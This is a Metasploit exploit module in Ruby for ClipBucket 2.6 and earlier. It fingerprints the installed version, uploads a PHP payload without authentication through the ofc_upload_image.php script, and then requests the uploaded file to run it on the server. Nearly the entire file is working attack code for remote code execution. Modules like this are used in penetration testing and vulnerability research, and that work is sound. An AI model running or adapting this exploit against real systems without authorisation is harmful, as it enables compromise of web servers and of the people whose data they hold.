##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ClipBucket Remote Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in ClipBucket version 2.6 and lower.
        The script "/admin_area/charts/ofc-library/ofc_upload_image.php" can be used to
        upload arbitrary code without any authentication. This module has been tested
        on version 2.6 on CentOS 5.9 32-bit.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Gabby', # Vulnerability Discovery, PoC
          'xistence <xistence[at]0x90.nl>' # Metasploit module
        ],
      'References'      =>
        [
          [ 'URL', 'http://packetstormsecurity.com/files/123480/ClipBucket-Remote-Code-Execution.html' ]
        ],
      'Platform'        => ['php'],
      'Arch'            => ARCH_PHP,
      'Targets'         =>
        [
          ['Clipbucket 2.6', {}]
        ],
      'Privileged'      => false,
      'DisclosureDate'  => "Oct 04 2013",
      'DefaultTarget'   => 0))

    register_options(
      [
       OptString.new('TARGETURI', [true, 'The base path to the ClipBucket application', '/'])
      ], self.class)
  end

  def uri
    return target_uri.path
  end

  def check
    # Check version
    peer = "#{rhost}:#{rport}"

    print_status("#{peer} - Trying to detect installed version")

    res = send_request_cgi({
     'method' => 'GET',
     'uri'    => normalize_uri(uri, "")
    })

    if res and res.code == 200 and res.body =~ /ClipBucket version (\d+\.\d+)/
      version = $1
    else
      return Exploit::CheckCode::Unknown
    end

    print_status("#{peer} - Version #{version} detected")

    if version > "2.6"
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    peer = "#{rhost}:#{rport}"
    payload_name = rand_text_alphanumeric(rand(10) + 5) + ".php"

    print_status("#{peer} - Uploading payload [ #{payload_name} ]")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, "admin_area", "charts", "ofc-library", "ofc_upload_image.php"),
      'headers'  => { 'Content-Type' => 'text/plain' },
      'vars_get' => { 'name' => payload_name },
      'data'  => payload.encoded
    })

    # If the server returns 200 we assume we uploaded the malicious
    # file successfully
    if not res or res.code != 200 or res.body !~ /Saving your image to: \.\.\/tmp-upload-images\/(#{payload_name})/ or res.body =~ /HTTP_RAW_POST_DATA/
      fail_with(Failure::None, "#{peer} - File wasn't uploaded, aborting!")
    end

    register_files_for_cleanup(payload_name)

    print_status("#{peer} - Executing Payload [ #{uri}/admin_area/charts/tmp-upload-images/#{payload_name} ]" )
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "admin_area", "charts", "tmp-upload-images", payload_name)
    })

    # If we don't get a 200 when we request our malicious payload, we suspect
    # we don't have a shell, either.
    if res and res.code != 200
      print_error("#{peer} - Unexpected response, probably the exploit failed")
    end

  end

end
